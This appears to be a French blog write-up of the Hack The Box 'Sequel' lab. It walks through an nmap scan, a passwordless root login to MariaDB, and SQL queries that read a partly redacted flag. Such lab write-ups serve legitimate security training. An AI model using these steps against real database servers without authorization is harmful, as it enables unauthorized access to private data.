---
title: "Sequel"
date: 2026-01-19
description: "Comment discuter avec une base de données?"
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, database, tier-1]
slug: sequel
---

# Introduction

Bienvenue sur **Sequel**. Cette machine est un excellent exercice pour comprendre comment interagir avec le service **MariaDB** en ligne de commande. Un administrateur a installé un serveur de base de données, mais a oublié un "petit" détail : mettre un mot de passe au compte super-utilisateur (**root**).

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation. Respectez les règles de la plateforme.
:::

[▶ RavenBreach sur YouTube](https://www.youtube.com/@Raven_Breach/videos)

---

## Reconnaissance

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.129.33.220

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
```

Un seul port ouvert : le **3306**. Le service est **MariaDB** (version 10.3.27).

---

## Pré-Exploitation

### Installation du client

```bash
sudo apt update && sudo apt install mysql*
```

### Test de la "porte ouverte"

```bash
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.33.220 -u root

Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

:::tip
Si vous avez une erreur liée au SSL, utilisez le flag `--skip-ssl` à la fin de la commande.
:::

La connexion est acceptée **sans mot de passe** !

---

## Exploitation

### 1. Lister les bases de données

```sql
MariaDB [(none)]> SHOW databases;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

La base **htb** est notre cible.

### 2. Entrer dans la base

```sql
MariaDB [(none)]> USE htb;
Database changed
```

### 3. Lister les tables

```sql
MariaDB [htb]> SHOW tables;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### 4. Extraire les données

```sql
MariaDB [htb]> SELECT * FROM config;

+----+-----------+-------------+
| id | name      | value       |
+----+-----------+-------------+
|  5 | flag      | 7b4{...}da8 |
+----+-----------+-------------+
```

Le flag est là. La machine est **pwned** !
